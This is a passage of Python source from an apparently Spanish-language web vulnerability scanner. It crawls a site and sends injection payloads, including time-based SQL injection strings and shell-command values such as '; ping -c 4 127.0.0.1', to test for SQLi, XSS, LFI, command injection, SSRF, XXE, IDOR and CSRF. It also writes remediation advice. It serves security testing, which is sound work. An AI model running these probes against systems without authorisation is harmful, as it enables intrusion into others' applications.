                print(f"  [*] Login como '{self.auth_user}' — OK")
                return True
            else:
                print(f"  [!] Login fallido para '{self.auth_user}'")
        except Exception as e:
            print(f"  [!] Error en login: {e}")
        return False

    def scan(self) -> list:
        print(f"\n  [*] WebApp scan: {self.target}")
        print(f"  [*] Checks activos: {', '.join(self.checks)}")

        if self.auth_user:
            self._login()

        self._crawl(self.target, depth=2)
        print(f"\n  [*] Encontrados: {len(self._forms)} formularios, {len(self._params)} URLs con parámetros")

        if "csrf" in self.checks:
            self._check_csrf()
        if "sqli" in self.checks:
            self._check_sqli()
        if "xss" in self.checks:
            self._check_xss()
        if "lfi" in self.checks:
            self._check_lfi()
        if "redirect" in self.checks:
            self._check_redirect()
        if "cmdi" in self.checks:
            self._check_cmdi()
        if "ssrf" in self.checks:
            self._check_ssrf()
        if "xxe" in self.checks:
            self._check_xxe()
        if "idor" in self.checks:
            self._check_idor()

        return self.findings

    # ── Crawler ───────────────────────────────────────────────────────────────

    def _crawl(self, url: str, depth: int):
        if depth == 0 or url in self._visited or len(self._visited) > 50:
            return
        if not url.startswith(self.target):
            return

        self._visited.add(url)
        try:
            resp = self.session.get(url, timeout=TIMEOUT, allow_redirects=True)
        except Exception:
            return

        # Extraer formularios
        forms = re.findall(
            r'<form[^>]*action=["\']?([^"\'> ]*)["\']?[^>]*>(.*?)</form>',
            resp.text, re.IGNORECASE | re.DOTALL
        )
        for action, body in forms:
            form_url = urljoin(url, action) if action else url
            method = "post" if 'method="post"' in body.lower() or "method='post'" in body.lower() else "get"
            inputs = re.findall(
                r'<input[^>]*name=["\']([^"\']+)["\'][^>]*(?:value=["\']([^"\']*)["\'])?',
                body, re.IGNORECASE
            )
            fields = {name: value or "test" for name, value in inputs if name.lower() not in ("submit", "_token", "csrf")}
            csrf_token = any(n.lower() in ("csrf_token", "_token", "csrf", "token") for n, _ in inputs)
            if fields:
                self._forms.append({
                    "url": form_url, "method": method,
                    "fields": fields, "has_csrf": csrf_token,
                    "page": url
                })

        # Extraer URLs con parámetros
        links = re.findall(r'href=["\']([^"\'#]+)["\']', resp.text, re.IGNORECASE)
        for link in links:
            full = urljoin(url, link)
            parsed = urlparse(full)
            if parsed.query and full not in self._visited:
                params = parse_qs(parsed.query)
                self._params.append({"url": full, "params": params, "parsed": parsed})
            if depth > 1 and full.startswith(self.target) and full not in self._visited:
                self._crawl(full, depth - 1)

    # ── CSRF ──────────────────────────────────────────────────────────────────

    def _check_csrf(self):
        print("\n  [*] Comprobando CSRF...")
        vulns = [f for f in self._forms if f["method"] == "post" and not f["has_csrf"]]
        if vulns:
            for f in vulns[:5]:
                self._add("MEDIUM", "CSRF",
                          f"Formulario POST sin token CSRF: {f['url']}",
                          f"El formulario en {f['page']} envía datos por POST sin token CSRF. "
                          f"Un atacante puede engañar a un usuario autenticado para que realice "
                          f"acciones no deseadas (cambiar contraseña, realizar pedidos, etc.).",
                          "Implementar tokens CSRF en todos los formularios POST. "
                          "Frameworks como WordPress, Laravel o Django los incluyen de serie.")
                print(f"    [MEDIUM] CSRF — {f['url']}")
        else:
            print("  [OK] Formularios POST con protección CSRF")

    # ── SQL Injection ─────────────────────────────────────────────────────────

    def _check_sqli(self):
        print("\n  [*] Comprobando SQL Injection...")
        tested = 0

        # En formularios
        for form in self._forms[:10]:
            for field in form["fields"]:
                for payload in SQLI_ERROR_PAYLOADS[:4]:
                    data = {**form["fields"], field: payload}
                    try:
                        time.sleep(self.delay)
                        if form["method"] == "post":
                            resp = self.session.post(form["url"], data=data, timeout=TIMEOUT)
                        else:
                            resp = self.session.get(form["url"], params=data, timeout=TIMEOUT)
                        if any(s in resp.text.lower() for s in SQLI_ERROR_SIGNS):
                            self._add("CRITICAL", "SQL INJECTION",
                                      f"SQL Injection (error-based) en {form['url']} — campo '{field}'",
                                      f"El campo '{field}' del formulario en {form['url']} es vulnerable "
                                      f"a inyección SQL. Un atacante puede leer, modificar o eliminar "
                                      f"toda la base de datos, incluyendo datos de clientes y contraseñas.\n"
                                      f"Payload: {payload}",
                                      "Usar consultas preparadas (prepared statements) en el código. "
                                      "Nunca concatenar variables de usuario directamente en SQL.")
                            print(f"    [CRITICAL] SQLi en {form['url']} campo='{field}'")
                            tested += 1
                            break
                    except Exception:
                        pass

        # Time-based en parámetros URL (prueba MySQL SLEEP, MSSQL WAITFOR, PG, Oracle)
        for p in self._params[:10]:
            for param in p["params"]:
                for time_payload in [SQLI_TIME_PAYLOAD, SQLI_TIME_PAYLOAD_MSSQL,
                                     "' AND pg_sleep(4)--",
                                     "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',4)--"]:
                    try:
                        url_parts = list(p["parsed"])
                        new_params = {**{k: v[0] for k, v in p["params"].items()}, param: time_payload}
                        url_parts[4] = urlencode(new_params)
                        test_url = urlunparse(url_parts)
                        time.sleep(self.delay)
                        t0 = time.time()
                        self.session.get(test_url, timeout=8)
                        elapsed = time.time() - t0
                        if elapsed >= 3.5:
                            self._add("CRITICAL", "SQL INJECTION",
                                      f"SQL Injection (time-based) en parámetro '{param}'",
                                      f"El parámetro '{param}' en {p['url']} introduce un retraso de "
                                      f"{elapsed:.1f}s al inyectar '{time_payload[:30]}', confirmando "
                                      f"ejecución de código SQL arbitrario en el servidor.",
                                      "Usar consultas preparadas (prepared statements). "
                                      "Validar y escapar todos los parámetros de entrada.")
                            print(f"    [CRITICAL] SQLi time-based — {param} ({elapsed:.1f}s)")
                            break
                    except Exception:
                        pass

        if tested == 0:
            print("  [OK] No se detectó SQL Injection en los formularios analizados")

    # ── XSS ──────────────────────────────────────────────────────────────────

    def _check_xss(self):
        print("\n  [*] Comprobando XSS...")
        found = 0

        for form in self._forms[:10]:
            for field in form["fields"]:
                for payload in XSS_PAYLOADS[:3]:
                    data = {**form["fields"], field: payload}
                    try:
                        time.sleep(self.delay)
                        if form["method"] == "post":
                            resp = self.session.post(form["url"], data=data, timeout=TIMEOUT)
                        else:
                            resp = self.session.get(form["url"], params=data, timeout=TIMEOUT)
                        if any(s in resp.text.lower() for s in XSS_SIGNS):
                            self._add("HIGH", "XSS REFLEJADO",
                                      f"Cross-Site Scripting reflejado en {form['url']} — campo '{field}'",
                                      f"El campo '{field}' devuelve el payload XSS sin sanitizar. "
                                      f"Un atacante puede enviar un enlace malicioso a un usuario "
                                      f"y robar su sesión, redirigirle a una web falsa o ejecutar "
                                      f"código en su navegador.\nPayload: {payload}",
                                      "Sanitizar y escapar todas las entradas de usuario antes de "
                                      "mostrarlas en HTML. Usar funciones como htmlspecialchars() en PHP "
                                      "o el sistema de plantillas del framework.")
                            print(f"    [HIGH] XSS en {form['url']} campo='{field}'")
                            found += 1
                            break
                    except Exception:
                        pass

        for p in self._params[:10]:
            for param in p["params"]:
                for payload in XSS_PAYLOADS[:2]:
                    try:
                        url_parts = list(p["parsed"])
                        new_params = {**{k: v[0] for k, v in p["params"].items()}, param: payload}
                        url_parts[4] = urlencode(new_params)
                        test_url = urlunparse(url_parts)
                        time.sleep(self.delay)
                        resp = self.session.get(test_url, timeout=TIMEOUT)
                        if any(s in resp.text.lower() for s in XSS_SIGNS):
                            self._add("HIGH", "XSS REFLEJADO",
                                      f"XSS reflejado en parámetro '{param}'",
                                      f"El parámetro '{param}' en la URL refleja el payload XSS sin "
                                      f"escapar. Riesgo de robo de sesión y phishing.\n"
                                      f"URL: {test_url[:100]}",
                                      "Escapar todos los valores antes de incluirlos en el HTML.")
                            print(f"    [HIGH] XSS en parámetro '{param}'")
                            found += 1
                            break
                    except Exception:
                        pass

        if found == 0:
            print("  [OK] No se detectó XSS reflejado")

    # ── LFI ──────────────────────────────────────────────────────────────────

    def _check_lfi(self):
        print("\n  [*] Comprobando LFI (Local File Inclusion)...")
        found = 0

        for p in self._params[:15]:
            for param, values in p["params"].items():
                if not any(kw in param.lower() for kw in LFI_PARAM_KEYWORDS):
                    continue
                for payload in LFI_PAYLOADS:
                    try:
                        url_parts = list(p["parsed"])
                        new_params = {**{k: v[0] for k, v in p["params"].items()}, param: payload}
                        url_parts[4] = urlencode(new_params)
                        test_url = urlunparse(url_parts)
                        resp = self.session.get(test_url, timeout=TIMEOUT)
                        if any(s in resp.text for s in LFI_SIGNS):
                            self._add("CRITICAL", "LFI — LOCAL FILE INCLUSION",
                                      f"Inclusión de archivos locales en parámetro '{param}'",
                                      f"El parámetro '{param}' permite leer archivos del servidor. "
                                      f"Se pudo leer /etc/passwd con el payload: {payload}\n"
                                      f"Un atacante puede leer archivos de configuración, "
                                      f"credenciales y código fuente del servidor.",
                                      "Validar y restringir los valores permitidos en parámetros "
                                      "de inclusión de archivos. Nunca usar entrada del usuario "
                                      "directamente en funciones include/require.")
                            print(f"    [CRITICAL] LFI en '{param}' — {p['url'][:60]}")
                            found += 1
                            break
                    except Exception:
                        pass

        if found == 0:
            print("  [OK] No se detectó LFI")

    # ── Open Redirect ─────────────────────────────────────────────────────────

    def _check_redirect(self):
        print("\n  [*] Comprobando Open Redirect...")
        found = 0

        for p in self._params[:15]:
            for param, values in p["params"].items():
                if not any(kw in param.lower() for kw in REDIRECT_PARAM_KEYWORDS):
                    continue
                for payload in REDIRECT_PAYLOADS:
                    try:
                        url_parts = list(p["parsed"])
                        new_params = {**{k: v[0] for k, v in p["params"].items()}, param: payload}
                        url_parts[4] = urlencode(new_params)
                        test_url = urlunparse(url_parts)
                        resp = self.session.get(test_url, timeout=TIMEOUT, allow_redirects=False)
                        location = resp.headers.get("Location", "")
                        if ("evil.com" in location or "javascript:" in location.lower()
                                or payload.rstrip("/") in location):
                            self._add("HIGH", "OPEN REDIRECT",
                                      f"Redirección abierta en parámetro '{param}'",
                                      f"El parámetro '{param}' redirige a cualquier URL externa. "
                                      f"Un atacante puede usar enlaces legítimos de este dominio "
                                      f"para redirigir a páginas de phishing.\n"
                                      f"URL: {test_url[:100]}\nRedirige a: {location}",
                                      "Validar que las URLs de redirección pertenecen al dominio propio. "
                                      "Usar listas blancas de destinos permitidos.")
                            print(f"    [HIGH] Open Redirect en '{param}'")
                            found += 1
                            break
                    except Exception:
                        pass

        if found == 0:
            print("  [OK] No se detectó Open Redirect")

    # ── Command Injection ─────────────────────────────────────────────────────

    def _check_cmdi(self):
        print("\n  [*] Comprobando Command Injection...")
        found = 0

        for form in self._forms[:5]:
            for field in form["fields"]:
                for payload in CMDI_PAYLOADS:
                    data = {**form["fields"], field: f"test{payload}"}
                    try:
                        t0 = time.time()
                        if form["method"] == "post":
                            resp = self.session.post(form["url"], data=data, timeout=8)
                        else:
                            resp = self.session.get(form["url"], params=data, timeout=8)
                        elapsed = time.time() - t0
                        if elapsed >= 3.5 and "sleep" in payload:
                            self._add("CRITICAL", "COMMAND INJECTION",
                                      f"Inyección de comandos OS en {form['url']} — campo '{field}'",
                                      f"El campo '{field}' ejecuta comandos del sistema operativo. "
                                      f"Se detectó un retraso de {elapsed:.1f}s con payload sleep. "
                                      f"Un atacante puede tomar control total del servidor.",
                                      "Nunca ejecutar comandos del sistema con entrada del usuario. "
                                      "Si es imprescindible, usar listas blancas estrictas y escapado.")
                            print(f"    [CRITICAL] CMDi en {form['url']} campo='{field}'")
                            found += 1
                    except Exception:
                        pass

        # CMDi time-based con ping (alternativa a sleep)
        for form in self._forms[:5]:
            for field in form["fields"]:
                for payload in ["; ping -c 4 127.0.0.1", "& ping -n 4 127.0.0.1 &"]:
                    data = {**form["fields"], field: f"test{payload}"}
                    try:
                        t0 = time.time()
                        if form["method"] == "post":
                            self.session.post(form["url"], data=data, timeout=8)
                        else:
                            self.session.get(form["url"], params=data, timeout=8)
                        elapsed = time.time() - t0
                        if elapsed >= 3.0:
                            self._add("CRITICAL", "COMMAND INJECTION",
                                      f"Inyección de comandos OS (ping time-based) en {form['url']} — '{field}'",
                                      f"El campo '{field}' ejecuta comandos del SO. "
                                      f"Retraso de {elapsed:.1f}s con payload ping. "
                                      f"Un atacante puede obtener shell remoto en el servidor.",
                                      "Nunca ejecutar comandos con entrada del usuario. "
                                      "Usar listas blancas y escapado estricto.")
                            print(f"    [CRITICAL] CMDi (ping) en {form['url']} campo='{field}'")
                            found += 1
                    except Exception:
                        pass

        if found == 0:
            print("  [OK] No se detectó Command Injection")

    # ── SSRF ──────────────────────────────────────────────────────────────────

    def _check_ssrf(self):
        """Comprueba SSRF en parámetros de URL que acepten URLs/IPs.
        Técnica: inyectar URLs de metadata cloud y servicios internos.
        Se detecta por respuesta con contenido de metadata o servicios internos.
        NOTA: La detección fiable de SSRF requiere un servidor OOB (Burp Collaborator,
        interactsh). Este check detecta respuestas directas visibles.
        """
        print("\n  [*] Comprobando SSRF...")
        found = 0

        ssrf_param_keywords = (
            "url", "link", "src", "source", "href", "host", "site",
            "dest", "redirect", "uri", "path", "page", "feed", "fetch",
            "proxy", "target", "endpoint", "callback", "webhook", "image",
        )
        ssrf_signs = [
            "ami-id", "instance-id", "security-credentials",  # AWS metadata
            "computeMetadata",                                  # GCP
            "latest/meta-data",
            "root:x:0:0",                                       # /etc/passwd via file://
            "127.0.0.1",
            "localhost",
        ]

        for p in self._params[:20]:
            for param, values in p["params"].items():
                if not any(kw in param.lower() for kw in ssrf_param_keywords):
                    continue
                # Probar primero los payloads de metadata cloud (más impactantes)
                for payload in SSRF_PAYLOADS[:15]:
                    try:
                        url_parts = list(p["parsed"])
                        new_params = {**{k: v[0] for k, v in p["params"].items()}, param: payload}
                        url_parts[4] = urlencode(new_params)
                        test_url = urlunparse(url_parts)
                        resp = self.session.get(test_url, timeout=TIMEOUT)
                        if any(s in resp.text for s in ssrf_signs):
                            self._add("CRITICAL", "SSRF",
                                      f"Server-Side Request Forgery en parámetro '{param}'",
                                      f"El parámetro '{param}' realiza peticiones HTTP desde el servidor. "
                                      f"Con el payload '{payload}' se obtuvo respuesta de servicio interno. "
                                      f"Un atacante puede acceder a metadata de cloud (credenciales AWS/GCP/Azure), "
                                      f"servicios internos (Redis, MySQL, Elasticsearch) y datos sensibles.",
                                      "Validar URLs contra lista blanca de dominios permitidos. "
                                      "Deshabilitar esquemas file://, gopher://, dict://. "
                                      "Bloquear acceso a rangos 169.254.x.x, 10.x.x.x, 192.168.x.x.")
                            print(f"    [CRITICAL] SSRF en '{param}' — {payload[:50]}")
                            found += 1
                            break
                    except Exception:
                        pass

        if found == 0:
            print("  [OK] No se detectó SSRF (detección directa)")

    # ── XXE ───────────────────────────────────────────────────────────────────

    def _check_xxe(self):
        """Comprueba XXE en endpoints que acepten XML o puedan aceptarlo.
        Técnica: enviar payload XXE cambiando Content-Type a application/xml.
        También prueba en formularios con campos de texto que puedan contener XML.
        """
        print("\n  [*] Comprobando XXE...")
        found = 0

        xxe_signs = [
            "root:x:0:0",                           # /etc/passwd leído
            "bin:x:",
            "[extensions]",                          # win.ini
            "ami-id",                                # AWS metadata
            "<?xml",                                 # parser devuelve XML procesado
        ]

        # Buscar endpoints que reciben POST con contenido potencialmente XML
        for form in self._forms[:10]:
            if form["method"] != "post":
                continue
            for payload in XXE_PAYLOADS[:5]:
                try:
                    time.sleep(self.delay)
                    resp = self.session.post(
                        form["url"],
                        data=payload,
                        headers={"Content-Type": "application/xml"},
                        timeout=TIMEOUT
                    )
                    if any(s in resp.text for s in xxe_signs):
                        self._add("CRITICAL", "XXE — XML EXTERNAL ENTITY",
                                  f"XXE en endpoint {form['url']}",
                                  f"El endpoint procesa entidades XML externas. "
                                  f"Se obtuvo contenido de archivo del servidor con payload XXE. "
                                  f"Un atacante puede leer archivos de configuración, código fuente "
                                  f"y credenciales del servidor.",
                                  "Deshabilitar el procesamiento de entidades externas en el parser XML. "
                                  "En PHP: libxml_disable_entity_loader(true). "
                                  "En Java: factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true).")
                        print(f"    [CRITICAL] XXE en {form['url']}")
                        found += 1
                        break
                except Exception:
                    pass

        # Intentar cambio de Content-Type en URLs con parámetros XML-like
        for p in self._params[:10]:
            for payload in XXE_PAYLOADS[:3]:
                try:
                    resp = self.session.post(
                        p["url"],
                        data=payload,
                        headers={"Content-Type": "text/xml"},
                        timeout=TIMEOUT
                    )
                    if any(s in resp.text for s in xxe_signs):
                        self._add("CRITICAL", "XXE — XML EXTERNAL ENTITY",
                                  f"XXE via content-type switching en {p['url'][:60]}",
                                  f"El endpoint acepta XML al cambiar Content-Type. "
                                  f"Potencial lectura de archivos del servidor.",
                                  "Deshabilitar entidades externas XML. Validar Content-Type esperado.")
                        print(f"    [CRITICAL] XXE (content-type switching) en {p['url'][:60]}")
                        found += 1
                        break
                except Exception:
                    pass

        if found == 0:
            print("  [OK] No se detectó XXE (detección directa)")

    # ── IDOR ─────────────────────────────────────────────────────────────────

    def _check_idor(self):
        print("\n  [*] Comprobando IDOR...")
        found = 0

        for p in self._params:
            url = p["url"]
            for pattern in IDOR_PATTERNS:
                match = re.search(pattern, url, re.IGNORECASE)
                if match:
                    param_name = match.group(1)
                    param_val  = match.group(2)
                    try:
                        orig_resp = self.session.get(url, timeout=TIMEOUT)
                        if orig_resp.status_code != 200:
                            continue

                        # Intentar acceder al recurso anterior y siguiente
                        for delta in [-1, 1, 999, 1000]:
                            try:
                                new_val = str(int(param_val) + delta)
                            except ValueError:
                                continue
                            test_url = url.replace(f"{param_name}={param_val}", f"{param_name}={new_val}")
                            test_resp = self.session.get(test_url, timeout=TIMEOUT)
                            if test_resp.status_code == 200 and len(test_resp.text) > 200:
                                if test_resp.text[:500] != orig_resp.text[:500]:
                                    self._add("HIGH", "IDOR",
                                              f"Posible IDOR en parámetro '{param_name}'",
                                              f"Cambiando el parámetro '{param_name}' de {param_val} "
                                              f"a {new_val} se obtiene contenido diferente (HTTP 200). "
                                              f"Puede indicar acceso a recursos de otros usuarios.\n"
                                              f"URL original: {url[:80]}\n"
                                              f"URL modificada: {test_url[:80]}",
                                              "Verificar autorización en el servidor para cada recurso. "
                                              "No confiar en que el usuario solo conoce sus propios IDs. "
                                              "Usar UUIDs en lugar de IDs secuenciales.")
                                    print(f"    [HIGH] Posible IDOR — {param_name}={param_val} → {new_val}")
                                    found += 1
                                    break
                    except Exception:
                        pass

        if found == 0:
            print("  [OK] No se detectó IDOR obvio")

    # ── Utilidades ────────────────────────────────────────────────────────────

    def _add(self, severidad, tipo, nombre, descripcion, recomendacion):
        # Evitar duplicados
        for f in self.findings:
            if f["nombre"] == nombre:
                return
        self.findings.append({
            "url":           self.target,
            "tipo":          tipo,
            "nombre":        nombre,
            "descripcion":   descripcion,
            "severidad":     severidad,
            "recomendacion": recomendacion,
        })

    def _normalize_url(self, url: str) -> str:
        if not url.startswith("http"):
            url = "https://" + url
        return url.rstrip("/")
